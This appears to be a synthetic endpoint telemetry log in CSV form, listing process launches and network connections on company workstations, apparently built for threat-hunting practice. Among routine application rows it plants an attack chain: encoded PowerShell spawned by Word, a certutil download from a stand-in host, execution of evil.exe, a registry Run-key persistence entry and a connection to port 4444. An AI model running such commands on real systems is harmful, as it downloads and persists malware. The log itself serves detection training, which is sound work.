timestamp,host,user,process,parent_process,command_line,ip,destination_port,user_agent
2026-04-05 11:06:00,ops-ws-02,bob,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,msedge
2026-04-05 11:07:00,fin-ws-01,liam,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-05 11:08:00,sales-lt-01,george,zoom.exe,explorer.exe,zoom.exe --background-task-mode,45.33.32.156,443,zoom-client
2026-04-05 11:09:00,corp-ws-03,alice,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-05 11:10:00,fin-ws-01,diana,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-05 11:11:00,corp-ws-02,irfan,code.exe,explorer.exe,"code.exe ""C:\Users\irfan\Documents\project""",10.2.10.15,445,none
2026-04-05 11:12:00,corp-ws-03,irfan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-05 11:13:00,sales-lt-01,julia,slack.exe,explorer.exe,slack.exe --background-task-mode,104.18.20.12,443,slack-client
2026-04-05 11:14:00,hr-ws-01,diana,outlook.exe,explorer.exe,"outlook.exe /recycle ""diana@company.com""",151.101.1.69,443,outlook
2026-04-05 11:15:00,eng-ws-01,charlie,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,23.45.67.89,443,msedge
2026-04-05 11:16:00,corp-ws-02,irfan,onenote.exe,explorer.exe,onenote.exe /background,10.0.2.20,0,none
2026-04-05 11:17:00,eng-ws-01,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",192.168.10.9,445,none
2026-04-05 11:18:00,corp-ws-04,george,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,msedge
2026-04-05 11:19:00,eng-ws-02,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,firefox
2026-04-05 11:20:00,fin-ws-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,firefox
2026-04-05 11:21:00,fin-ws-02,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",104.18.20.12,443,outlook
2026-04-05 11:22:00,eng-ws-01,karen,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-05 11:22:00,ops-ws-01,irfan,powershell.exe,winword.exe,powershell -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA,8.8.8.8,443,python-requests
2026-04-05 11:23:00,fin-ws-02,helen,slack.exe,explorer.exe,slack.exe --background-task-mode,151.101.1.69,443,slack-client
2026-04-05 11:23:00,ops-ws-01,irfan,powershell.exe,winword.exe,powershell -enc aW52b2tlLXd...,1.1.1.1,443,curl/7.68
2026-04-05 11:24:00,sales-lt-01,helen,slack.exe,explorer.exe,slack.exe --background-task-mode,104.18.20.12,443,slack-client
2026-04-05 11:24:00,ops-ws-01,irfan,powershell.exe,winword.exe,powershell -enc ZABvAHcAbgBsAG8AYQBkAC0AZQB4AGUALgAuAA==,45.33.32.156,80,winhttp
2026-04-05 11:25:00,hr-ws-01,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-05 11:26:00,fin-ws-01,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,msedge
2026-04-05 11:27:00,fin-ws-01,liam,teams.exe,explorer.exe,teams.exe --background-task-mode,45.33.32.156,443,teams-client
2026-04-05 11:28:00,ops-ws-02,liam,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-05 11:29:00,corp-ws-03,alice,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
2026-04-05 11:30:00,corp-ws-04,george,slack.exe,explorer.exe,slack.exe --background-task-mode,8.8.8.8,443,slack-client
2026-04-05 11:31:00,ops-ws-01,farah,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
2026-04-05 11:32:00,fin-ws-02,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",1.1.1.1,443,outlook
2026-04-05 11:33:00,eng-ws-02,alice,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-05 11:34:00,corp-ws-03,alice,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,chrome
2026-04-05 11:35:00,fin-ws-02,alice,outlook.exe,explorer.exe,"outlook.exe /recycle ""alice@company.com""",151.101.1.69,443,outlook
2026-04-05 11:36:00,corp-ws-03,liam,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-05 11:37:00,ops-ws-02,ethan,outlook.exe,explorer.exe,"outlook.exe /recycle ""ethan@company.com""",151.101.1.69,443,outlook
2026-04-05 11:38:00,fin-ws-02,farah,slack.exe,explorer.exe,slack.exe --background-task-mode,104.18.20.12,443,slack-client
2026-04-05 11:39:00,corp-ws-01,george,zoom.exe,explorer.exe,zoom.exe --background-task-mode,185.199.108.153,443,zoom-client
2026-04-05 11:40:00,hr-ws-01,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.0.1.15,0,none
2026-04-05 11:41:00,ops-ws-01,julia,slack.exe,explorer.exe,slack.exe --background-task-mode,151.101.1.69,443,slack-client
2026-04-05 11:42:00,sales-lt-01,george,slack.exe,explorer.exe,slack.exe --background-task-mode,185.199.108.153,443,slack-client
2026-04-05 11:43:00,fin-ws-02,farah,onenote.exe,explorer.exe,onenote.exe /background,10.2.10.15,0,none
2026-04-05 11:44:00,sales-lt-01,diana,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-05 11:45:00,sales-lt-01,diana,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-05 11:46:00,ops-ws-01,karen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\karen\Documents\notes.txt""",10.2.10.15,0,none
2026-04-05 11:47:00,fin-ws-02,charlie,zoom.exe,explorer.exe,zoom.exe --background-task-mode,8.8.8.8,443,zoom-client
2026-04-05 11:48:00,corp-ws-01,julia,teams.exe,explorer.exe,teams.exe --background-task-mode,1.1.1.1,443,teams-client
2026-04-05 11:49:00,ops-ws-01,bob,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-05 11:50:00,corp-ws-04,julia,onenote.exe,explorer.exe,onenote.exe /background,172.16.10.8,0,none
2026-04-05 11:51:00,fin-ws-01,julia,excel.exe,explorer.exe,excel.exe /background,10.2.10.15,0,none
2026-04-05 11:52:00,corp-ws-02,julia,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-05 11:53:00,corp-ws-03,liam,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,msedge
2026-04-05 11:54:00,fin-ws-01,george,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-05 11:55:00,fin-ws-02,george,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-05 11:56:00,corp-ws-02,diana,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-05 11:56:00,eng-ws-01,helen,notepad.exe,explorer.exe,notepad.exe,45.33.32.156,4444,winhttp
2026-04-05 11:57:00,eng-ws-02,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-05 11:57:00,eng-ws-01,helen,notepad.exe,explorer.exe,notepad.exe,104.18.20.12,443,python-requests
2026-04-05 11:58:00,eng-ws-02,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,chrome
2026-04-05 11:59:00,corp-ws-02,charlie,slack.exe,explorer.exe,slack.exe --background-task-mode,185.199.108.153,443,slack-client
2026-04-05 12:00:00,corp-ws-02,george,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-05 12:01:00,eng-ws-02,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",151.101.1.69,443,outlook
2026-04-05 12:02:00,corp-ws-03,helen,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-05 12:03:00,ops-ws-01,irfan,onenote.exe,explorer.exe,onenote.exe /background,192.168.10.9,0,none
2026-04-05 12:04:00,corp-ws-01,charlie,teams.exe,explorer.exe,teams.exe --background-task-mode,142.250.183.14,443,teams-client
2026-04-05 12:05:00,eng-ws-02,george,zoom.exe,explorer.exe,zoom.exe --background-task-mode,104.18.20.12,443,zoom-client
2026-04-05 12:06:00,corp-ws-03,george,code.exe,explorer.exe,"code.exe ""C:\Users\george\Documents\project""",10.0.0.10,445,none
2026-04-05 12:07:00,ops-ws-01,karen,winword.exe,explorer.exe,winword.exe /background,10.0.1.15,0,none
2026-04-05 12:08:00,sales-lt-01,farah,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,8.8.8.8,443,firefox
2026-04-05 12:09:00,corp-ws-02,liam,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-05 12:10:00,ops-ws-01,karen,teams.exe,explorer.exe,teams.exe --background-task-mode,52.95.110.1,443,teams-client
2026-04-05 12:11:00,ops-ws-01,farah,code.exe,explorer.exe,"code.exe ""C:\Users\farah\Documents\project""",192.168.10.9,445,none
2026-04-05 12:12:00,corp-ws-01,ethan,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,chrome
2026-04-05 12:13:00,corp-ws-04,irfan,slack.exe,explorer.exe,slack.exe --background-task-mode,45.33.32.156,443,slack-client
2026-04-05 12:14:00,corp-ws-04,diana,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-05 12:15:00,corp-ws-03,karen,outlook.exe,explorer.exe,"outlook.exe /recycle ""karen@company.com""",52.95.110.1,443,outlook
2026-04-05 12:16:00,eng-ws-01,charlie,onenote.exe,explorer.exe,onenote.exe /background,10.0.1.15,0,none
2026-04-05 12:17:00,corp-ws-02,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,msedge
2026-04-05 12:18:00,corp-ws-01,helen,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,msedge
2026-04-05 12:19:00,ops-ws-02,irfan,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,msedge
2026-04-05 12:20:00,fin-ws-01,karen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\karen\Documents\notes.txt""",10.0.2.20,0,none
2026-04-05 12:21:00,ops-ws-01,helen,teams.exe,explorer.exe,teams.exe --background-task-mode,23.45.67.89,443,teams-client
2026-04-05 12:22:00,corp-ws-01,liam,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,142.250.183.14,443,msedge
2026-04-05 12:23:00,ops-ws-01,ethan,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,firefox
2026-04-05 12:24:00,corp-ws-01,george,slack.exe,explorer.exe,slack.exe --background-task-mode,8.8.8.8,443,slack-client
2026-04-05 12:25:00,fin-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,10.1.5.12,0,none
2026-04-05 12:26:00,ops-ws-02,alice,excel.exe,explorer.exe,excel.exe /background,10.2.10.15,0,none
2026-04-05 12:27:00,fin-ws-02,farah,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\farah\Documents\notes.txt""",10.1.5.12,0,none
2026-04-05 12:28:00,sales-lt-01,helen,teams.exe,explorer.exe,teams.exe --background-task-mode,8.8.8.8,443,teams-client
2026-04-05 12:29:00,sales-lt-01,farah,outlook.exe,explorer.exe,"outlook.exe /recycle ""farah@company.com""",185.199.108.153,443,outlook
2026-04-05 12:30:00,sales-lt-01,charlie,teams.exe,explorer.exe,teams.exe --background-task-mode,142.250.183.14,443,teams-client
2026-04-05 12:31:00,fin-ws-02,helen,slack.exe,explorer.exe,slack.exe --background-task-mode,104.18.20.12,443,slack-client
2026-04-05 12:32:00,corp-ws-03,karen,slack.exe,explorer.exe,slack.exe --background-task-mode,142.250.183.14,443,slack-client
2026-04-05 12:33:00,ops-ws-01,karen,slack.exe,explorer.exe,slack.exe --background-task-mode,45.33.32.156,443,slack-client
2026-04-05 12:34:00,corp-ws-02,charlie,outlook.exe,explorer.exe,"outlook.exe /recycle ""charlie@company.com""",104.18.20.12,443,outlook
2026-04-05 12:35:00,ops-ws-02,diana,excel.exe,explorer.exe,excel.exe /background,172.16.10.8,0,none
2026-04-05 12:36:00,eng-ws-02,bob,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-05 12:37:00,corp-ws-01,liam,slack.exe,explorer.exe,slack.exe --background-task-mode,142.250.183.14,443,slack-client
2026-04-05 12:38:00,hr-ws-01,liam,zoom.exe,explorer.exe,zoom.exe --background-task-mode,142.250.183.14,443,zoom-client
2026-04-05 12:39:00,eng-ws-02,irfan,excel.exe,explorer.exe,excel.exe /background,10.0.1.15,0,none
2026-04-05 12:40:00,ops-ws-02,charlie,zoom.exe,explorer.exe,zoom.exe --background-task-mode,45.33.32.156,443,zoom-client
2026-04-05 12:41:00,hr-ws-01,george,zoom.exe,explorer.exe,zoom.exe --background-task-mode,1.1.1.1,443,zoom-client
2026-04-05 12:42:00,fin-ws-02,karen,teams.exe,explorer.exe,teams.exe --background-task-mode,52.95.110.1,443,teams-client
2026-04-05 12:43:00,ops-ws-01,diana,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-05 12:44:00,corp-ws-03,liam,code.exe,explorer.exe,"code.exe ""C:\Users\liam\Documents\project""",10.0.0.10,445,none
2026-04-05 12:45:00,eng-ws-02,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",172.16.10.8,445,none
2026-04-05 12:46:00,corp-ws-02,charlie,teams.exe,explorer.exe,teams.exe --background-task-mode,45.33.32.156,443,teams-client
2026-04-05 12:47:00,eng-ws-01,alice,winword.exe,explorer.exe,winword.exe /background,10.1.5.12,0,none
2026-04-05 12:48:00,corp-ws-02,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,msedge
2026-04-05 12:49:00,sales-lt-01,george,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,45.33.32.156,443,chrome
2026-04-05 12:50:00,ops-ws-01,irfan,zoom.exe,explorer.exe,zoom.exe --background-task-mode,104.18.20.12,443,zoom-client
2026-04-05 12:51:00,corp-ws-02,farah,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,msedge
2026-04-05 12:52:00,hr-ws-01,irfan,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-05 12:53:00,corp-ws-04,diana,teams.exe,explorer.exe,teams.exe --background-task-mode,23.45.67.89,443,teams-client
2026-04-05 12:54:00,ops-ws-02,karen,onenote.exe,explorer.exe,onenote.exe /background,172.16.4.25,0,none
2026-04-05 12:55:00,corp-ws-01,liam,zoom.exe,explorer.exe,zoom.exe --background-task-mode,142.250.183.14,443,zoom-client
2026-04-05 12:56:00,eng-ws-01,helen,teams.exe,explorer.exe,teams.exe --background-task-mode,8.8.8.8,443,teams-client
2026-04-05 12:57:00,hr-ws-01,helen,onenote.exe,explorer.exe,onenote.exe /background,10.0.0.5,0,none
2026-04-05 12:58:00,sales-lt-01,bob,winword.exe,explorer.exe,winword.exe /background,10.0.2.20,0,none
2026-04-05 12:59:00,corp-ws-04,karen,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-05 13:00:00,fin-ws-02,bob,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-05 13:00:00,ops-ws-02,farah,certutil.exe,cmd.exe,certutil -urlcache -split -f http://downloads.badcdn.net/update.exe file.exe,23.45.67.89,80,curl/7.68
2026-04-05 13:01:00,fin-ws-01,charlie,excel.exe,explorer.exe,excel.exe /background,172.16.4.25,0,none
2026-04-05 13:01:00,ops-ws-02,farah,evil.exe,explorer.exe,C:\Users\farah\AppData\Local\Temp\evil.exe,192.168.10.9,0,none
2026-04-05 13:02:00,eng-ws-01,george,excel.exe,explorer.exe,excel.exe /background,192.168.10.9,0,none
2026-04-05 13:02:00,ops-ws-02,farah,reg.exe,cmd.exe,reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v updater /t REG_SZ /d evil.exe,172.16.10.8,0,none
2026-04-05 13:03:00,corp-ws-03,helen,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\helen\Documents\notes.txt""",172.16.4.25,0,none
2026-04-05 13:04:00,corp-ws-01,alice,code.exe,explorer.exe,"code.exe ""C:\Users\alice\Documents\project""",10.2.10.15,445,none
2026-04-05 13:05:00,eng-ws-02,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-05 13:06:00,ops-ws-01,julia,outlook.exe,explorer.exe,"outlook.exe /recycle ""julia@company.com""",52.95.110.1,443,outlook
2026-04-05 13:07:00,ops-ws-02,julia,excel.exe,explorer.exe,excel.exe /background,10.0.0.5,0,none
2026-04-05 13:08:00,ops-ws-01,helen,winword.exe,explorer.exe,winword.exe /background,172.16.10.8,0,none
2026-04-05 13:09:00,corp-ws-01,julia,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,185.199.108.153,443,firefox
2026-04-05 13:10:00,sales-lt-01,bob,code.exe,explorer.exe,"code.exe ""C:\Users\bob\Documents\project""",172.16.4.25,445,none
2026-04-05 13:11:00,ops-ws-02,liam,slack.exe,explorer.exe,slack.exe --background-task-mode,1.1.1.1,443,slack-client
2026-04-05 13:12:00,ops-ws-02,diana,zoom.exe,explorer.exe,zoom.exe --background-task-mode,151.101.1.69,443,zoom-client
2026-04-05 13:13:00,corp-ws-01,irfan,winword.exe,explorer.exe,winword.exe /background,10.0.0.5,0,none
2026-04-05 13:14:00,sales-lt-01,farah,slack.exe,explorer.exe,slack.exe --background-task-mode,45.33.32.156,443,slack-client
2026-04-05 13:15:00,ops-ws-01,helen,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,104.18.20.12,443,firefox
2026-04-05 13:16:00,ops-ws-01,charlie,code.exe,explorer.exe,"code.exe ""C:\Users\charlie\Documents\project""",192.168.1.12,445,none
2026-04-05 13:17:00,fin-ws-01,bob,slack.exe,explorer.exe,slack.exe --background-task-mode,1.1.1.1,443,slack-client
2026-04-05 13:18:00,hr-ws-01,irfan,teams.exe,explorer.exe,teams.exe --background-task-mode,23.45.67.89,443,teams-client
2026-04-05 13:19:00,corp-ws-04,george,teams.exe,explorer.exe,teams.exe --background-task-mode,52.95.110.1,443,teams-client
2026-04-05 13:20:00,sales-lt-01,liam,teams.exe,explorer.exe,teams.exe --background-task-mode,45.33.32.156,443,teams-client
2026-04-05 13:21:00,ops-ws-02,ethan,code.exe,explorer.exe,"code.exe ""C:\Users\ethan\Documents\project""",172.16.10.8,445,none
2026-04-05 13:22:00,sales-lt-01,bob,firefox.exe,explorer.exe,firefox.exe --profile-directory=Default --new-window https://portal.company.internal,1.1.1.1,443,firefox
2026-04-05 13:23:00,eng-ws-02,julia,chrome.exe,explorer.exe,chrome.exe --profile-directory=Default --new-window https://portal.company.internal,52.95.110.1,443,chrome
2026-04-05 13:24:00,eng-ws-01,liam,notepad.exe,explorer.exe,"notepad.exe ""C:\Users\liam\Documents\notes.txt""",172.16.10.8,0,none
2026-04-05 13:25:00,hr-ws-01,charlie,slack.exe,explorer.exe,slack.exe --background-task-mode,45.33.32.156,443,slack-client
2026-04-05 13:26:00,corp-ws-01,alice,msedge.exe,explorer.exe,msedge.exe --profile-directory=Default --new-window https://portal.company.internal,151.101.1.69,443,msedge
